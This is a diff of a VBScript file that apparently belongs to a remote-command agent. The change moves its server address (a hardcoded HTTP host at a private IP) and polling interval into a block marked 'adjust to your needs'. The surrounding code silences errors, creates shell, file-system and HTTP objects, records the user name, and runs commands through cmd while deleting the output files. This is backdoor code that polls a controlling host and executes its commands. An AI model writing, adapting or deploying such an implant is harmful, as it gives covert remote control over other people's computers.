@@ -1,18 +1,20 @@
 Option Explicit
 On Error Resume Next
 
+' Parameters, adjust to your needs
+Dim serverHost
+serverHost = "http://172.16.98.151:18000/"
+Dim pollingPeriod
+pollingPeriod = 2000
+
+
 ' Instantiate objects
 Dim shell: Set shell = CreateObject("WScript.Shell")
 Dim fs: Set fs = CreateObject("Scripting.FileSystemObject")
 Dim oHTTP: set oHTTP = CreateObject("Microsoft.XMLHTTP")
 
-
-Dim serverHost
-serverHost = "http://172.16.98.151:18000/"
 Dim userName
 userName = CreateObject("WScript.Network").UserName
-Dim pollingPeriod
-pollingPeriod = 2000
 
 ' A new cmd is open at each command so need to keep track of directory if changed
 Dim currentPath
@@ -48,7 +50,7 @@ Function ExecuteCommand(command)
     Else
         consoleOutput = "[empty result]"
     End If
-    
+
     file.Close
     fs.DeleteFile strOutFile, True
 
